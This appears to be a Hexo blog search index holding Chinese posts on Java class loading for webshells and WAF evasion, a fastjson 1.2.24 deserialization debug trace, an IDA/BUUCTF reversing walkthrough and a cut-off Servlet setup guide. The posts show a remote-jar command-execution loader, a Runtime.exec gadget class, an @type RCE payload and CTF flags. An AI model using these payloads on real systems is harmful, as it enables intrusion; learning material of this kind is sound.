<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java类加载机制与应用</title>
      <link href="/2023/12/10/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
      <url>/2023/12/10/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="java类加载机制与应用"><a href="#java类加载机制与应用" class="headerlink" title="java类加载机制与应用"></a>java类加载机制与应用</h1><p><em>学习类加载，有助于更好的进行攻击。如：</em></p><p><em>使用冰蝎和哥斯拉的webshell，利用字节码加载的方式绕过<strong>waf</strong>检测</em></p><p><em>在其他反<strong>序列化</strong>漏洞（比如fastjson反序列化漏洞）中的利用链中使用</em></p><p>我的感受：</p><p>   开始学java时候学这些东西的时候，我确实搞得一脸懵。当学过一些java反序列化后。学到fastjson反序列化的时候，就是这里没搞好，也搞搞得懵逼了。但又回来学习这个类加载的时候，就感觉刚刚好</p><p>Java是一个依赖于<code>JVM</code>（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a><strong>ClassLoader</strong></h2><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code>。</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><p>其他加载类的方法：</p><p>反射加载forName(clazzName,init,classload)</p><p>后面两个是可选参数，分别表示是否进行类初始化，指定类加载器</p><h2 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a><strong>Java类动态加载方式</strong></h2><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>,<code>显式</code>即我们通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象，而<code>隐式</code>指的是<code>类名.方法名()</code>或<code>new</code>类实例。<code>显式</code>类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p><p><strong>常用的类动态加载方式：</strong></p><pre class="language-none"><code class="language-none">// 反射加载TestHelloWorld示例Class.forName("com.anbai.sec.classloader.TestHelloWorld");// ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");</code></pre><p>不同：</p><ul><li>反射加载类forName。是调用了defineClass。会触发静态代码块</li><li>使用类加载器加载用loadClass只是将类load进来，不会触发静态代码块</li></ul><h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a><strong>ClassLoader类加载流程</strong></h2><p>理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习<code>ClassLoader</code>。</p><p><code>ClassLoader</code>加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类<code>loadClass</code>重要流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.anbai.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a><strong>自定义ClassLoader</strong></h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net``.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><p>如果<code>com.anbai.sec.classloader.TestHelloWorld</code>类存在的情况下，我们可以使用如下代码即可实现调用<code>hello</code>方法并输出：</p><pre class="language-none"><code class="language-none">TestHelloWorld t = new TestHelloWorld();        String str = t.hello();        System.out.println(str);</code></pre><p>但是如果<code>com.anbai.sec.classloader.TestHelloWorld</code>根本就不存在于我们的<code>classpath</code>，那么我们可以使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p><pre class="language-none"><code class="language-none">package com.anbai.sec.classloader;import java.lang.reflect.Method;public class TestClassLoader extends ClassLoader {    // TestHelloWorld类名    private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";   // TestHelloWorld类字节码    private static byte[] testClassBytes = new byte[]{            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,            0, 0, 0, 2, 0, 12    };    @Overridepublic Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {        // 只处理TestHelloWorld类        if (name.equals(testClassName)) {            // 调用JVM的native方法定义TestHelloWorld类            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);        }        return super.findClass(name);    }    public static void main(String[] args) {        // 创建自定义的类加载器        TestClassLoader loader = new TestClassLoader();        try {            // 使用自定义的类加载器加载TestHelloWorld类            Class testClass = loader.loadClass(testClassName);            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();            Object testInstance = testClass.newInstance();            // 反射获取hello方法            Method method = testInstance.getClass().getMethod("hello");            // 反射调用hello方法,等价于 String str = t.hello();            String str = (String) method.invoke(testInstance);            System.out.println(str);        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a><strong>URLClassLoader</strong></h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p>一般用来加载jar文件，加载本地的使用file协议，远程的http</p><pre class="language-none"><code class="language-none">package com.anbai.sec.classloader;import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.net.URL;import java.net.URLClassLoader; public class TestURLClassLoader {    public static void main(String[] args) {        try {            // 定义远程加载的jar路径            URL url = new URL("https://anbai.io/tools/cmd.jar");            // 创建URLClassLoader对象，并加载远程jar包            URLClassLoader ucl = new URLClassLoader(new URL[]{url});            // 定义需要执行的系统命令            String cmd = "ls";            // 通过URLClassLoader加载远程jar包中的CMD类            Class cmdClass = ucl.loadClass("CMD");            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);            // 获取命令执行结果的输入流            InputStream           in   = process.getInputStream();            ByteArrayOutputStream baos = new ByteArrayOutputStream();            byte[]                b    = new byte[1024];            int                   a    = -1;            // 读取命令执行结果            while ((a = in.read(b)) != -1) {                baos.write(b, 0, a);            }            // 输出命令执行结果            System.out.println(baos.toString());        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>远程的<code>cmd.jar</code>中就一个<code>CMD.class</code>文件，对应的编译之前的代码片段如下：</p><pre class="language-none"><code class="language-none">import java.io.IOException;public class CMD {    public static Process exec(String cmd) throws IOException {        return Runtime.getRuntime().exec(cmd);    }}</code></pre><h2 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a><strong>类加载隔离</strong></h2><p>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。</p><p>也就是同级类加载器不能使用另外一个类加载器load的类。只能通过反射调用</p><p><strong>跨类加载</strong></p><p>  跨类加载器调用类方法时需要特别注意一个基本原则：<code>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</code></p><pre class="language-none"><code class="language-none">package com.anbai.sec.classloader;import java.lang.reflect.Method;import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;public class TestCrossClassLoader {    public static class ClassLoaderA extends ClassLoader {       public ClassLoaderA(ClassLoader parent) {            super(parent);        }        {            // 加载类字节码            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);        }    }    public static class ClassLoaderB extends ClassLoader {        public ClassLoaderB(ClassLoader parent) {            super(parent);        }        {            // 加载类字节码            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);        }    }    public static void main(String[] args) throws Exception {        // 父类加载器        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();        // A类加载器        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);        // B类加载器        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);        // 使用A/B类加载器加载同一个类        Class&lt;?&gt; aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);        Class&lt;?&gt; aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);        Class&lt;?&gt; bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);        // 比较A类加载和B类加载器加载的类是否相等        System.out.println("aClass == aaClass：" + (aClass == aaClass));        System.out.println("aClass == bClass：" + (aClass == bClass));        System.out.println("\n" + aClass.getName() + "方法清单：");        // 获取该类所有方法        Method[] methods = aClass.getDeclaredMethods();        for (Method method : methods) {            System.out.println(method);        }        // 创建类实例        Object instanceA = aClass.newInstance();        // 获取hello方法        Method helloMethod = aClass.getMethod("hello");        // 调用hello方法        String result = (String) helloMethod.invoke(instanceA);        System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);    }}</code></pre><p>输出结果</p><pre class="language-none"><code class="language-none">aClass == aaClass：true        aClass == bClass：false        com.anbai.sec.classloader.TestHelloWorld方法清单：public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~</code></pre><h2 id="JSP自定义类加载类型的后门"><a href="#JSP自定义类加载类型的后门" class="headerlink" title="JSP自定义类加载类型的后门"></a><strong>JSP自定义类加载类型的后门</strong></h2><p>  以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p><h2 id="BCEL字节码加载"><a href="#BCEL字节码加载" class="headerlink" title="BCEL字节码加载"></a><strong>BCEL字节码加载</strong></h2><p>未完待续….</p><p>参考：<a href="https://javasec.org/javase/ClassLoader/">https://javasec.org/javase/ClassLoader/</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化解析过程调试</title>
      <link href="/2023/12/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95/"/>
      <url>/2023/12/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson反序列化解析过程调试"><a href="#fastjson反序列化解析过程调试" class="headerlink" title="fastjson反序列化解析过程调试"></a>fastjson反序列化解析过程调试</h1><p>简单水一下fastjson反序列化解析过程的调试</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastjson是阿里巴巴开源的java中解析json的一个组件。其功能就是将json字符串与java对象进行相互转化。正如其名，解析j转化速度很快</p><p>但fastjson多个版本都爆出反序列化漏洞，因此当遇到json时，可以看是否用了fastjson，再测是否存在漏洞</p><p>当json中含有@type字段时，fastjson会将json解析为对应类的对象</p><p>本篇文章主要是fastjson在反序列化解析的调试</p><h2 id="调式的代码"><a href="#调式的代码" class="headerlink" title="调式的代码"></a>调式的代码</h2><p><strong>环境</strong>：</p><ul><li>jdk8</li><li>fastjson 1.2.24</li></ul><p>导入（pom.xml）</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>自定义的恶意类</p><pre class="language-none"><code class="language-none">package org.example.enity;import java.io.IOException;public class Test {    public void setCmd(String cmd) throws IOException {        Runtime.getRuntime().exec(cmd);    }}</code></pre><p>这里并不是标准的JavaBean,没有cmd属性，但有setCmd方法</p><p>调试代码</p><pre class="language-none"><code class="language-none">String s="{\"@type\":\"org.example.enity.Test\",\"cmd\":\"calc\"}";JSONObject student=JSON.parseObject(s);</code></pre><h2 id="JSON-parseObject方法"><a href="#JSON-parseObject方法" class="headerlink" title="JSON.parseObject方法"></a>JSON.<em>parseObject方法</em></h2><p>具体代码</p><img src="/img/12-4/2.png"><ol><li><h4 id="初步解析"><a href="#初步解析" class="headerlink" title="初步解析"></a>初步解析</h4></li></ol><p> 可以看出，第一步就是反序列化得到一个obj对象，后面会将该对象转为JSON对象</p><p>那么整个反序列化和解析逻辑都在这个parse方法中</p><ol start="2"><li><h4 id="进入parse方法"><a href="#进入parse方法" class="headerlink" title="进入parse方法:"></a>进入parse方法:</h4></li></ol><p>具体解析的函数是在JSON类中的parse方法</p><img src="/img/12-4/1.png"><p>前面的就是简单解析进行初始化，将json字符串封装到parser对象中</p><ol start="3"><li><h4 id="进入JSON类中的parse方法："><a href="#进入JSON类中的parse方法：" class="headerlink" title="进入JSON类中的parse方法："></a>进入JSON类中的parse方法：</h4></li></ol><p>前面几层套娃(…)，到这里开始解析左边界，</p><img src="/img/12-4/3.png"><p>当解析到{时,会返回一个对象</p><ol start="4"><li><h4 id="然后继续进入parseObject方法："><a href="#然后继续进入parseObject方法：" class="headerlink" title="然后继续进入parseObject方法："></a>然后继续进入parseObject方法：</h4></li></ol><p>首先会进行类加载</p><img src="/img/12-4/4.png"><p>类加载的时候，会判断是否是一些特殊的类，然后在从从默认加载的类中寻找，如果没有才会用类加载器加载，如下</p><img src="/img/12-4/5.png"><img src="/img/12-4/6.png"><p>那么我们给出的类就已经加载到内存了</p><p>后面的步骤就是获取反序列化器，和进行反序列化了</p><img src="/img/12-4/7.png"><ol start="5"><li><h4 id="进入ParserConfig类中的getDeserializer方法："><a href="#进入ParserConfig类中的getDeserializer方法：" class="headerlink" title="进入ParserConfig类中的getDeserializer方法："></a>进入ParserConfig类中的getDeserializer方法：</h4></li></ol><p>首先查询是否为已经加载的反序列化器和默认类反序列化器</p><img src="/img/12-4/8.png"><img src="/img/12-4/9.png"><p>最后创建一个反序列化器，并将其放入derializers中，表示已经加载的反序列化器</p><img src="/img/12-4/10.png"><ol start="6"><li><h4 id="进入createJavaBeanDeserializer方法："><a href="#进入createJavaBeanDeserializer方法：" class="headerlink" title="进入createJavaBeanDeserializer方法："></a>进入createJavaBeanDeserializer方法：</h4></li></ol><p>在里面会创建一个JavaBeanInfo对象</p><p>其实这一个函数才是本次调试的核心方法</p><img src="/img/12-4/11.png"><p>跟进build方法，首先可以看到使用反射获取我们给的类的方法属性和方法</p><img src="/img/12-4/12.png"><ul><li>获取所有setXXX(标准javaBean中存在的方法)</li></ul><p>遍历方法数组，选取出符合条件的方法</p><p>下图为部分代码截图</p><img src="/img/12-4/13.png"><p>筛选条件：</p><ul><li>方法名长度&gt;=4</li><li>不能是静态方法</li><li>不能是无参函数，且必须有返回</li><li>参数个数为1</li><li>方法名必须以set开头</li><li>不能有注解</li></ul><p>根据这些条件能够选出setXXX，不一定是javaBean中的setXXX，只要满足条件就行（比如我定义的恶意类setCmd函数）</p><p>根据这点，后面的fastjson反序列漏洞寻找能利用的方法。</p><p>然后根据方法推断出属性名</p><p>类似的获取getXXX</p><img src="/img/12-4/14.png"><p>最后根据前面获取的东西，构造JavaBeanInfo对象（会把一些构造器啥的丢进去）</p><img src="/img/12-4/15.png"><p>然后会根据JavaBeanInfo对象构造反序列化器</p><p>进入ASMDeserializerFactory类中的createJavaBeanDeserializer：</p><p>这就是最后构造反序列化器的函数(晕</p><img src="/img/12-4/16.png"><p>这里开始会进行初始化操作，对象类名设置为fastjson自定义的类名</p><p>然后反射newInstance构造一个实例返回</p><p>至此原来的createJavaBeanDeserializer函数结束。</p><p>整个获取反序列器的步骤结束</p><ol start="7"><li><h4 id="利用反序列化器进行反序列化"><a href="#利用反序列化器进行反序列化" class="headerlink" title="利用反序列化器进行反序列化"></a>利用反序列化器进行反序列化</h4></li></ol><img src="/img/12-4/17.png"><p>这步好像是不能调试的。但也差不多了。成功调用了setCmd函数，弹出了计算器。说明反序列化的时候会调用setXXX方法</p><img src="/img/12-4/18.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过调试可以发现</p><p>JSON.<em>parseObject方法是</em></p><ul><li>会先会获取反序列化器，同时通过反射获取所有的setXXX和getXXX</li><li>将所有属性和值放入反序列化器</li><li>反序列化的时候会调用该属性的setXXX设置对象属性</li></ul><p>因此上面我们的代码中</p><p>我们定义的类没有cmd属性，但我们传入cmd键时，反序列化时触发setcmd方法，因此造成了命令执行。</p><p>最后，想说好久没更新了文章了。主要是最近好一段时间都没怎么深入投入学习，并有各种事情忙。（我想立flag了</p><p>初识java安全，确实我也是小白</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> java安全 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA的使用与re浅浅入门</title>
      <link href="/2023/11/06/IDA%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8Ere%E6%B5%85%E6%B5%85%E5%85%A5%E9%97%A8/"/>
      <url>/2023/11/06/IDA%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8Ere%E6%B5%85%E6%B5%85%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA的使用与re浅浅入门"><a href="#IDA的使用与re浅浅入门" class="headerlink" title="IDA的使用与re浅浅入门"></a>IDA的使用与re浅浅入门</h1><h2 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h2><ul><li>左侧是函数窗口，显示一些函数，可以crtf+f寻找main函数,找到主程序</li></ul><img src="/img/11-6/2.png" height="500px"><ul><li>主体是汇编代码，可以通过空格切换查看视图</li></ul><img src="/img/11-6/3.png"><ul><li>内存分段，直接明了看所在内存的位置</li></ul><img src="/img/11-6/4.png"><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><ul><li>F5键–反汇编，，转化为伪C代码</li></ul><img src="/img/11-6/5.png"> <ul><li>shift+F12 切换到字符串展示界面(String Window)所有字符串在这里显示</li></ul><img src="/img/11-6/6.png"> <ul><li>crtf+X 交叉引用 寻找数据被引用的地方</li></ul><img src="/img/11-6/7.png"> <ul><li>g键 跳转到地址处</li></ul><img src="/img/11-6/8.png"> <ul><li>alt+t  搜索指令</li></ul><img src="/img/11-6/9.png"> <img src="/img/11-6/10.png"> <ul><li>n键对函数进行重命名</li></ul><img src="/img/11-6/11.png"> <ul><li>ctrl+z撤销操作</li></ul><p><strong>数据操作</strong></p><ul><li>d键转化数据格式，h结尾代表十六进制</li></ul><img src="/img/11-6/1.png"> <ul><li>a键转化为字符串</li><li>c键转化为汇编代码</li><li>u键转化为原始形式</li><li>shift+e导出选定数据</li><li>对在程序中一些数据右键可以改变其数据类型，原始的char是数字的形式</li></ul><img src="/img/11-6/12.png"> <ul><li>ctrl+e进入程序起始位置</li></ul><h2 id="BUUCTF-re前三题"><a href="#BUUCTF-re前三题" class="headerlink" title="BUUCTF re前三题"></a>BUUCTF re前三题</h2><h3 id="easyre1"><a href="#easyre1" class="headerlink" title="easyre1"></a><strong>easyre1</strong></h3><p>将程序拖入IDA,很好进来就是main函数</p><img src="/img/11-6/13.png"><p>F5,反汇编一下，得到flag ,flag{this_Is_a_EaSyRe}</p><img src="/img/11-6/14.png"><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a><strong>reverse1</strong></h3><p>一进来不是主函数，尝试在左边找到main，没找到 (</p><p>shift+F12 查看所有字符串，找到关键字符串this is the right flag!</p><img src="/img/11-6/15.png"><p>双击进入</p><img src="/img/11-6/16.png"><p>ctrl+x找到引用函数 ，再F5反汇编</p><img src="/img/11-6/18.png"><p>右键hide cast，隐藏标记以防看不懂</p><p>可以对一些熟悉的函数进行重命名，如sub_1400111D1就是printf函数</p><p>这里主要是对我们输入的字符串与Str2对比，如果一样就输出this is the right flag!，表明我们输入了正确的flag</p><p>那我们就看看此时的Str2是什么，他就是flag</p><img src="/img/11-6/19.png"> <p>双击进入，发现是{hello_world}</p><p>但返回刚才代码发现，程序对原始的Str2进行了修改</p><p>将某些数字改为字符类型，更为直白</p><img src="/img/11-6/20.png"><p>最后看这程序，是把Str2中的o改为0</p><img src="/img/11-6/21.png">  <p>因此最后flag为flag{hell0_w0rld}</p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a><strong>reverse2</strong></h3><p>这个题目和上面的类似，不过一进来就是main函数，不要找了)</p><p>F5反汇编，跟上面的一样的逻辑</p><img src="/img/11-6/22.png"> <p>这里主要是flag变量</p><p>将前面修改flag的代码中的字符类型数据转化一下</p><img src="/img/11-6/23.png"> <p>这里主要是将flag中的i和r改为1</p><p>双击flag变量，查看内容</p><p>发现这里没有显示全</p><img src="/img/11-6/24.png"> <p>选中按下a，变为字符串</p><img src="/img/11-6/25.png"> <p>更改字符</p><p>得到最后flag,flag{hack1ng_fo1_fun}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> re入门 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建和配置Servlet项目</title>
      <link href="/2023/10/15/%E5%88%9B%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AEServlet%E9%A1%B9%E7%9B%AE/"/>
      <url>/2023/10/15/%E5%88%9B%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AEServlet%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="创建和配置Servlet项目"><a href="#创建和配置Servlet项目" class="headerlink" title="创建和配置Servlet项目"></a>创建和配置Servlet项目</h2><p>servlet是原生的javaweb</p><p>这里学习javaweb时候，配置Servlet项目，idea社区版怎么手动配置Servlet项目,于是就搞了一个教程,也是算入坑javaweb了</p><h5 id="1-创建一个项目"><a href="#1-创建一个项目" class="headerlink" title="1.创建一个项目"></a><strong>1.创建一个项目</strong></h5><img src="/img/9-8/1.png"> <h5 id="2-添加web模块"><a href="#2-添加web模块" class="headerlink" title="2.添加web模块"></a><strong>2.添加web模块</strong></h5><p>先选择创建的项目，打开模块设置</p><img src="/img/9-8/2.png"> <p>在模块中选中自己的项目，添加web模块</p><img src="/img/9-8/3.png"> <p>然后确定</p><img src="/img/9-8/4.png"> <h5 id="3-配置web模块"><a href="#3-配置web模块" class="headerlink" title="3.配置web模块"></a><strong>3.配置web模块</strong></h5><p>在生成的web目录下的WEB-INF目录下创建classes目录，用于存放编译后的文件</p><img src="/img/9-8/5.png"> <p>再次打开模块设置，在模块中选择我们的项目，设置输出路径，将两个路径改为刚创建好的classes目录</p><img src="/img/9-8/6.png"> <p>点击修正，然后创建一个工件</p><img src="/img/9-8/7.png"> <p>最后确定</p><img src="/img/9-8/8.png"> <h5 id="4-配置Tomcat启动项"><a href="#4-配置Tomcat启动项" class="headerlink" title="4.配置Tomcat启动项"></a><strong>4.配置Tomcat启动项</strong></h5><p>打开运行配置</p><img src="/img/9-8/9.png"> <p>添加Tomcat配置</p><img src="/img/9-8/10.png"> <p>配置Tomcat,配置好Tomcat的安装路径</p><img src="/img/9-8/11.png"> <p>添加部署，选择刚设置好的工件</p><img src="/img/9-8/12.png"> <p>最后确定，当然也可以设置其他东西，如上下文，端口等等</p><img src="/img/9-8/13.png"> <h5 id="6-引入外部jar包"><a href="#6-引入外部jar包" class="headerlink" title="6.引入外部jar包"></a><strong>6.引入外部jar包</strong></h5><p>打开模块设置，添加Tomcat安装目录下的lib目录下的servlet-api.jar</p><p>这里也可以在web目录下创建lib目录,来放置导入的包!</p><img src="/img/9-8/14.png"> <h5 id="7-启动简单的实例"><a href="#7-启动简单的实例" class="headerlink" 